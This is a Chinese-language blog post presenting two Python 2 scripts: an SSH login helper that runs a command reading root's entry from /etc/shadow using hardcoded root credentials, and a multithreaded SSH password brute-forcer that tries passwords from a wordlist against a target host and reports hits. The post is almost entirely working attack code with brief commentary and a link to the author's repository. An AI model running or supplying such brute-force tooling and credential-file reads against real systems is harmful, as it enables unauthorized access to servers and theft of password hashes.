---
layout: post
title: "SSH登陆器"
date: 2016-12-19T16:17:26
categories: [Aha moments]
tags: [elfsong.cn]
---

*对我而言，武术的非凡之处在于它的简单。简单的方法也是正确的方法，同时武术也没有什么特别之处。越是接近武术的真谛，招式表现上浪费越少。*

我们先来看一段代码，这是整个登陆器的核心所在。

```
#!/usr/bin/python
# -*- coding: utf-8 -*-
import pexpect
PROMPT = ['# ', '>>> ', '> ','\$ ']
def send_command(child, cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print child.before
def connect(user, host, password):
    ssh_newkey = 'Are you sure you want to continue connecting'
    connStr = 'ssh ' + user + '@' + host
    child = pexpect.spawn(connStr)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword:'])
    if ret == 0:
        print '[-] Error Connecting'
        return
    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword:'])
        if ret == 0:
            print '[-] Error Connecting'
            return
    child.sendline(password)
    child.expect(PROMPT)
    return child
def main():
    host = 'localhost'
    user = 'root'
    password = 'toor'
    child = connect(user, host, password)
    send_command(child, 'cat /etc/shadow | grep root')
if __name__ == '__main__':
    main()
```

这段代码中，PROMPT表示ssh的提示符，当发现提示符的时候，说明我们以及成功连接SSH了。

之后我们发现，pexcept提供了一个名叫PxSSH的专用脚本，它预置了login(), logout(), prompt() 等函数直接与SSH交互。这为我们节约了大量的时间。下面是利用PxSSH编写的一套SSH暴力登陆破解器。

```
import pxssh
import optparse
import time
from threading import *
maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0
def connect(host, user, password, release):
	global Found
	global Fails
	try:
		s = pxssh.pxssh()
		s.login(host, user, password)
		print '[+] Password Found: ' + password
		Found = True
	except Exception, e:
		if 'read_nonblocking' in str(e):
			Fails += 1
			time.sleep(5)
			connect(host, user, password, False)
		elif 'synchronize with original prompt' in str(e):
			time.sleep(1)
			connect(host, user, password, False)
	finally:
		if release: connection_lock.release()
def main():
	parser = optparse.OptionParser('usage %prog '+ '-H  -u  -F ')
	parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
	parser.add_option('-F', dest='passwdFile', type='string', help='specify password file')
	parser.add_option('-u', dest='user', type='string', help='specify the user')
	(options, args) = parser.parse_args()
	host = options.tgtHost
	passwdFile = options.passwdFile
	user = options.user
	if host == None or passwdFile == None or user == None:
		print parser.usage
		exit(0)
	fn = open(passwdFile, 'r')
	for line in fn.readlines():
		if Found:
			print "[*] Exiting: Password Found"
			exit(0)
		if Fails > 5:
			print "[!] Exiting: Too Many Socket Timeouts"
			exit(0)
		connection_lock.acquire()
		password = line.strip('\r').strip('\n')
		print "[-] Testing: "+str(password)
		t = Thread(target=connect, args=(host, user, password, True))
		child = t.start()
if __name__ == '__main__':
	main()
```

如果在这里代码看起来不太舒服的话，欢迎去我的Github查看：

```
[https://github.com/Elfsong/WintersWrath/blob/master/python/sshBrute.py](https://github.com/Elfsong/WintersWrath/blob/master/python/sshBrute.py)
```
